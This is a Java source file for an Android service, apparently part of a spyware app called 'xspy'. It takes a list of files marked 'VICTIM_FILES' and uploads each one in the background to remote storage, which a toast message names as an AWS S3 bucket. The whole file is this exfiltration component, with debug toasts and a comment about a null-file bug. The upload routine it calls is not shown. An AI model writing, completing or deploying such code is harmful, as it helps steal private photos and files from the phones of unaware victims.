package com.redeyesncode.xspy.backend.services;

import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.IBinder;
import android.widget.Toast;

import androidx.annotation.Nullable;

import com.redeyesncode.xspy.backend.AndroidContactModel;
import com.redeyesncode.xspy.models.FileBody;
import com.redeyesncode.xspy.repo.MainRepository;

import java.util.ArrayList;

public class FileUploadService extends Service {

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        Toast.makeText(this, " FileUploadService onBind ", Toast.LENGTH_LONG).show();

        return null;
    }

    @Override
    public void onCreate() {
        Toast.makeText(this, " FileUploadService Created ", Toast.LENGTH_LONG).show();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Toast.makeText(this, " FileUploadService Started", Toast.LENGTH_LONG).show();
        new Thread(new Runnable() {
            @Override
            public void run() {
                // Call the API here
                ArrayList<FileBody> fileBodies = intent.getParcelableArrayListExtra("VICTIM_FILES");

                new ImageUploadApiCall(fileBodies).execute();
            }
        }).start();
        return START_STICKY;
    }

    private class ImageUploadApiCall extends AsyncTask<Void, Void, Void> {
        private ArrayList<FileBody> fileBodies;
        public ImageUploadApiCall(ArrayList<FileBody> contactModels) {
            this.fileBodies = contactModels;
        }

        @Override
        protected Void doInBackground(Void... voids) {
            MainRepository mainRepository = new MainRepository();
            for (FileBody fileBody:
                    fileBodies) {
                // Here file is returned null.
                // issue check : 26 Apr 2023
                mainRepository.uploadMedia(fileBody.getFile(),"ASHU_ANDROID");
            }
            return null;
        }
        @Override
        protected void onPostExecute(Void aVoid) {
            // Handle any UI updates here
            Toast.makeText(FileUploadService.this, "Uploaded YOUR IMAGES AWS S3 Bucket !", Toast.LENGTH_LONG).show();
        }
    }

}
